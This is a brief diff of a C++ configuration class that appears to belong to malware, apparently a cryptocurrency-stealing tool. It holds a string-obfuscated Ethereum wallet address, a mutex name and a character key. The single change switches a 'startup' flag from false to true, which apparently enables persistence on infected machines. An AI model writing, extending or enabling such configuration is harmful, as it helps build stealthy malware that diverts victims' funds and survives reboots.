@@ -9,7 +9,7 @@ class Config
 		std::string EthereumAddress = OBFUSCATE("0x176B24B4c871Df6e0fE4E0c735Db075064b47Bc4");
 		std::string useragent = OBFUSCATE("somesecret");
 		std::string mutex = OBFUSCATE("mutex");
-		bool startup = false;
+		bool startup = true;
 		char key[3] = { 'K', 'C', 'Q' }; //Any chars will work
 };
 
